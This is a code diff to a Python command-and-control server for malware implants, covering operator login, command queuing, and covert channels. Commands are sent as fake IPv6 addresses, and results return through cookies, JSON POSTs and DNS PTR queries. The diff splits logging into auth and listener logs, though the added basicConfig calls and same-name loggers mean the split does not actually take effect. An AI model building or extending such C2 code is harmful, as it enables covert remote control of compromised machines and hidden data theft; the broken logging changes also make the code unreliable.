@@ -54,6 +54,24 @@ logging.basicConfig(
     datefmt='%Y-%m-%d %H:%M:%S',
 )
 
+# Logger configuration
+auth_log = logging.getLogger(__name__)
+logging.basicConfig(
+    filename='auth.log',
+    level=logging.DEBUG,
+    format='%(asctime)s.%(msecs)03d %(levelname)s %(module)s - %(funcName)s: %(message)s',
+    datefmt='%Y-%m-%d %H:%M:%S',
+)
+
+# Logger configuration
+listener_log = logging.getLogger(__name__)
+logging.basicConfig(
+    filename='listener.log',
+    level=logging.DEBUG,
+    format='%(asctime)s.%(msecs)03d %(levelname)s %(module)s - %(funcName)s: %(message)s',
+    datefmt='%Y-%m-%d %H:%M:%S',
+)
+
 # Load the default config file
 with open('s_conf.json', 'r') as file:
     config = json.load(file)
@@ -138,7 +156,7 @@ def verify_auth_token(uri, received_token, received_timestamp):
     # Ensure the timestamp is within the allowed time window
     current_time = int(time.time())
     if abs(current_time - int(received_timestamp)) > time_window:
-        logger.error("token past time window")
+        auth_log.error("token past time window")
         return False
 
     # Recalculate the HMAC based on the URI and timestamp
@@ -384,16 +402,17 @@ def handle_client(client_socket, client_id):
 
         match request_type:
             case "AUTH":
-                logger.info("authenticating user")
+                auth_log.info("authenticating user")
                 request_type, uname, token = client_request.split(" ", 2)
-                logger.info(f"checking authentication details for {uname}")
+                auth_log.info(f"checking authentication details for {uname}")
                 if pw_hash.compare_hash(uname, token):
-                    logger.info("user authenticated, generating session token")
+                    auth_log.info("user authenticated, generating session token")
                     returned_token = secrets.token_hex()
                     client_socket.send(returned_token.encode())
                     operator_session_tokens.add(returned_token)
                 else:
                     client_socket.send("Bad username or password :red".encode())
+                    logger.error(f"auth with bad username/password: user -> {uname}")
 
             case "PUB":
                 logger.info("request to send command, attempting")
@@ -516,11 +535,11 @@ def register_routes():
         comp = route_info.get('comp', False)
 
         if comp:
-            logger.info(f"listener using compression for {request.method}")
+            listener_log.info(f"listener using compression for {request.method}")
 
-            logger.info(f"{request.method} incoming for listener URI")
+            listener_log.info(f"{request.method} incoming for listener URI")
             cookie_value = next(iter(request.cookies.values()))
-            logger.info("got cookies")
+            listener_log.info("got cookies")
             url_decoded_data = cookie_value.rstrip("=")  # Remove existing padding
             padding = len(url_decoded_data) % 4
             if padding:
@@ -530,64 +549,50 @@ def register_routes():
             decompressed_data = zlib.decompress(compressed_data)
             unparsed_query = decompressed_data.decode('utf-8')
             parsed_data = urllib.parse.parse_qs(unparsed_query)
-
             get_imp_id = parsed_data.get('id')
-            logger.info(get_imp_id[0])
-
-            operator, command = get_waiting_command(get_imp_id[0])
-            if operator is False:
-                logger.error("operator and command in queue returned as false")
-                abort(404)
-            checkout_command(get_imp_id[0], operator, command)
-            command = json.dumps(ipv6_encoder.string_to_ipv6(command))
-            logger.info("sending command and HMAC to implant")
-            hmac_k = hmac.new(imp_psk1.encode(), command.encode(), hashlib.sha256)
-            hmac_sig = hmac_k.hexdigest()
-            return jsonify(
-                message=command,
-                key=hmac_sig
-            )
+            get_imp_id = get_imp_id[0]
 
         elif not comp:
             logger.info("uncompressed data")
             rcv_timestamp = request.cookies.get('timestamp')
             rcv_token = request.cookies.get('token')
             get_imp_id = request.cookies.get('id')
-            logger.info("got the token and timestamp from cookies")
-            logger.info(f"info: {rcv_token}, {rcv_timestamp}, {get_imp_id}")
-            operator, command = get_waiting_command(get_imp_id)
-            if operator is False:
-                logger.error("operator and command in queue returned as false")
-                abort(404)
-            checkout_command(get_imp_id, operator, command)
-            command = json.dumps(ipv6_encoder.string_to_ipv6(command))
-            logger.info("sending command and HMAC to implant")
-            hmac_k = hmac.new(imp_psk1.encode(), command.encode(), hashlib.sha256)
-            hmac_sig = hmac_k.hexdigest()
-            return jsonify(
-                message=command,
-                key=hmac_sig
-            )
+            listener_log.info("got the token and timestamp from cookies")
+            listener_log.info(f"info: {rcv_token}, {rcv_timestamp}, {get_imp_id}")
 
+
+        operator, command = get_waiting_command(get_imp_id)
+        if operator is False:
+            logger.error("operator and command in queue returned as false")
+            abort(404)
+        checkout_command(get_imp_id, operator, command)
+        command = json.dumps(ipv6_encoder.string_to_ipv6(command))
+        logger.info("sending command and HMAC to implant")
+        hmac_k = hmac.new(imp_psk1.encode(), command.encode(), hashlib.sha256)
+        hmac_sig = hmac_k.hexdigest()
+        return jsonify(
+            message=command,
+            key=hmac_sig
+        )
 
     @app.route("/", methods=['POST'])
     def def_endpoint2():
         imp_id = request.cookies.get('id')
         if request.content_type == "application/json":
-            logger.info(f"{imp_id} sending us data")
+            listener_log.info(f"{imp_id} sending us data")
             # Get the data
             result = request.get_json()
             # The result comes in as a JSON object under the field msg
             result = result.get("msg")
             # Check which operator is waiting for a result
             queue = implant_checkout[imp_id]
-            logger.info("got queue for operator")
+            listener_log.info("got queue for operator")
             operator, set_command = queue.get()
-            logger.info(f"sending {operator} command")
+            listener_log.info(f"sending {operator} command")
             handle_update(operator, imp_id, result, set_command)
             return "200"
         elif request.content_type == "application/dns-message":
-            logger.info("dns PTR request used for data sent to us")
+            listener_log.info("dns PTR request used for data sent to us")
             dns_query = request.data
             name_list = []
             # Parse the DNS query using dnslib
@@ -621,7 +626,7 @@ def register_routes():
             queue = implant_checkout[str(get_imp_id)]
             logger.info("got queue for operator")
             operator, set_command = queue.get()
-            logger.info(f"sending {operator} command")
+            logger.info(f"sending {operator} result")
             handle_update(operator, imp_id, result, set_command)
 
             # Send the implant a reply to the PTR request
